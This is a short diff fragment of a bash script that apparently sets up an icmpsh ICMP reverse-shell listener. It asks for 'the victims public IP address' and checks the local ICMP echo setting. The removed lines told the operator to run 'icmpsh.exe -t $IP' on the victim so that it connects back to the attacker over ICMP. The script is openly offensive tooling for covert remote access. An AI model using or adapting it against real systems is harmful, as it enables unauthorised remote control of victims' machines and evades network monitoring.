@@ -19,15 +19,6 @@ echo -e "\e[1;31m---------------------------------------------------------------
 echo -e "\e[01;31m[?]\e[00m What is the victims public IP address?"
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
 read VICTIM
-echo ""
-echo -e "\e[01;32m[-]\e[00m Run the following code on your victim system on the listender has started:"
-echo ""
-echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
-echo ""
-echo "icmpsh.exe -t "$IP" -d 500 -b 30 -s 128"
-echo ""
-echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
-echo ""
 LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
 if [ "$LOCALICMP" -eq 0 ]
                 then 
